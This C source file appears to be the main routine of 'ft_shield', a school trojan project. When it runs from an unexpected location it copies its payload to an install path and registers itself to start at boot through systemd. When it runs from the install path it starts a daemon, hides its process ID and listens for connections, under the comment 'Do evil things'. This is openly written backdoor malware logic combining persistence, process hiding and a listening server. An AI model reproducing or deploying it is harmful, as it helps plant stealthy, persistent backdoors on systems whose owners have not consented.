#include "../includes/ft_shield.h"
// Check PATH where it is executed
// ANSWER: readlink to retrive full path of the executable
// https://stackoverflow.com/questions/933850/how-do-i-find-the-location-of-the-executable-in-c
int main ( void )
{
    char buf[1024];
    // check where is it executed
    int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    buf[i] = '\0';

    if (strcmp(buf, EXECUTABLE_FILE)) {
        printf("robrodri & jalvarad.\n");
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        copy_payload(buf);
        // systems without systemctl will not work
        startup_setup();
    }
    else { // Do evil things
        t_daemon *daemon = create_daemon();
        hide_pid();
        server_listen(daemon);
        free(daemon);
    }
    return (EXIT_SUCCESS);
}

// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/
